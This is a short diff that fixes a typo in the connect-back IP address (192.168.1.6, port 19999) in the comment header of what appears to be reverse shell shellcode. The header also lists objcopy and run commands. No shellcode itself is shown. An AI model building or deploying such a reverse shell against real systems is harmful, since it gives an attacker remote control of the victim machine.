@@ -7,7 +7,7 @@ Dump shellcode :$ objcopy --dump-section .text=reverse_shell.raw ./reverse_shell
 Run            :$ ./reverse_shell.elf
 
 Connects back to machine @
-IP  : 1192.168.1.6 (0xc0.0xa8.0x01.0x06)  
+IP  : 192.168.1.6 (0xc0.0xa8.0x01.0x06)  
 port: 19999 (0x4e1f)
 
 */
